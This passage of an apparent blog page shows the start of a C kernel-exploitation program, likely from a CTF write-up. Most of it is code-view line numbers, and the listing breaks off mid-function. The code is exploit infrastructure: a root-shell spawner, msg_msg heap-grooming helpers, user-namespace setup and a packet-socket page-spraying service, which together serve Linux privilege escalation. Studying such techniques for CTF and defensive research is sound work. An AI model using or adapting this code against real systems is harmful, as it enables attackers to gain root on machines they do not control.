class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Kernel Pwn Infrastructures</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUCCESS_MSG(msg)    <span class="hljs-string">&quot;\033[32m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INFO_MSG(msg)       <span class="hljs-string">&quot;\033[34m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR_MSG(msg)      <span class="hljs-string">&quot;\033[31m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_success(msg)    puts(SUCCESS_MSG(msg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_info(msg)       puts(INFO_MSG(msg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_error(msg)      puts(ERROR_MSG(msg))</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(ERROR_MSG(<span class="hljs-string">&quot;[x] Error at: &quot;</span>) <span class="hljs-string">&quot;%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(SUCCESS_MSG(<span class="hljs-string">&quot;[*] Process binded to core &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        log_error(<span class="hljs-string">&quot;[x] Failed to get the root!&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    log_success(<span class="hljs-string">&quot;[+] Successful to get the root.&quot;</span>);<br>    log_info(<span class="hljs-string">&quot;[*] Execve root shell now...&quot;</span>);<br><br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>    <span class="hljs-comment">/* to exit the process normally, instead of potential segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_msg_queue</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * the msgp should be a pointer to the `struct msgbuf`,</span><br><span class="hljs-comment"> * and the data should be stored in msgbuf.mtext</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">write_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    ((<span class="hljs-keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY 040000</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">peek_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <br>                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">unshare_setup</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> edit[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> tmp_fd;<br><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET) &lt; <span class="hljs-number">0</span>) &#123;<br>        log_error(<span class="hljs-string">&quot;[x] Unable to create new namespace for PGV subsystem&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EPERM;<br>    &#125;<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);<br>    write(tmp_fd, <span class="hljs-string">&quot;deny&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;deny&quot;</span>));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getuid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getgid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * pgv pages sprayer related </span><br><span class="hljs-comment"> * not that we should create two process:</span><br><span class="hljs-comment"> * - the parent is the one to send cmd and get root</span><br><span class="hljs-comment"> * - the child creates an isolate userspace by calling unshare_setup(),</span><br><span class="hljs-comment"> *      receiving cmd from parent and operates it only</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_SOCKET_MAX_NR 1024</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_VERSION 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_TX_RING 13</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_nr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_nr;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> &#123;</span><br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-type">int</span> cmd;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    PGV_CMD_ALLOC_SOCKET,<br>    PGV_CMD_ALLOC_PAGE,<br>    PGV_CMD_FREE_PAGE,<br>    PGV_CMD_FREE_SOCKET,<br>    PGV_CMD_EXIT,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">tpacket_versions</span> &#123;</span><br>    TPACKET_V1,<br>    TPACKET_V2,<br>    TPACKET_V3,<br>&#125;;<br><br><span class="hljs-type">int</span> cmd_pipe_req[<span class="hljs-number">2</span>], cmd_pipe_reply[<span class="hljs-number">2</span>];<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">create_packet_socket</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> socket_fd;<br>    <span class="hljs-type">int</span> ret;<br><br>    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);<br>    <span class="hljs-keyword">if</span> (socket_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        log_error(<span class="hljs-string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)&quot;</span>);<br>        ret = socket_fd;<br>        <span class="hljs-keyword">goto</span> err_out;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> socket_fd;<br><br>err_out:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_socket_pages</span><span class="hljs-params">(<span class="hljs-type">int</span> socket_fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">unsigned</span> nr)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> version, ret;<br><br>    version = TPACKET_V1;<br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, <br>                     &amp;version, <span class="hljs-keyword">sizeof</span>(version));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        log_error(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_VERSION)&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_setsockopt;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req));<br>    req.tp_block_size = size;<br>    req.tp_block_nr = nr;<br>    req.tp_frame_size = <span class="hljs-number">0x1000</span>;<br>    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;<br><br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        log_error(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_TX_RING)&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_setsockopt;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err_setsockopt:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">free_socket_pages</span><span class="hljs-params">(<span class="hljs-type">int</span> socket_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> ret;<br>    <br>    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req));<br>    req.tp_block_size = <span class="hljs-number">0x3361626e</span>;<br>    req.tp_block_nr = <span class="hljs-number">0</span>;<br>    req.tp_frame_size = <span class="hljs-number">0x74747261</span>;<br>    req.tp_frame_nr = <span class="hljs-number">0</span>;<br><br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        log_error(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_TX_RING)&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_setsockopt;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err_setsockopt:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spray_cmd_handler</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> socket_fd[PGV_SOCKET_MAX_NR];<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-comment">/* create an isolate namespace*/</span><br>    <span class="hljs-keyword">if</span> (unshare_setup()) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to initialize PGV subsystem for page spraying!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(socket_fd, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(socket_fd));<br><br>    <span class="hljs-comment">/* handler request */</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        read(cmd_pipe_req[<span class="hljs-number">0</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br><br>        <span class="hljs-keyword">switch</span> (req.cmd) &#123;<br>        <span class="hljs-keyword">case</span> PGV_CMD_ALLOC_SOCKET:<br>            <span class="hljs-keyword">if</span> (socket_fd[req.idx] != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(ERROR_MSG(<span class="hljs-string">&quot;[x] Duplicate idx request: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>,req.idx);<br>                ret = -EINVAL;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            ret = create_packet_socket();<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                perror(ERROR_MSG(<span class="hljs-string">&quot;[x] Failed at allocating packet socket&quot;</span>));<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            socket_fd[req.idx] = ret;<br>            ret = <span class="hljs-number">0</span>;<br><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> PGV_CMD_ALLOC_PAGE:<br>            <span class="hljs-keyword">if</span> (socket_fd[req.idx] == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(ERROR_MSG(<span class="hljs-string">&quot;[x] No socket fd for idx: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>,req.idx);<br>                ret = -EINVAL;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            ret = alloc_socket_pages(socket_fd[req.idx], req.size, req.nr);<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                perror(ERROR_MSG(<span class="hljs-string">&quot;[x] Failed to alloc packet socket pages&quot;</span>));<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> PGV_CMD_FREE_PAGE:<br>            <span class="hljs-keyword">if</span> (socket_fd[req.idx] == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(ERROR_MSG(<span class="hljs-string">&quot;[x] No socket fd for idx: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>,req.idx);<br>                ret = -EINVAL;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            ret = free_socket_pages(socket_fd[req.idx]);<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                perror(ERROR_MSG(<span class="hljs-string">&quot;[x] Failed to free packet socket pages&quot;</span>));<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> PGV_CMD_FREE_SOCKET:<br>            <span class="hljs-keyword">if</span> (socket_fd[req.idx] == <span 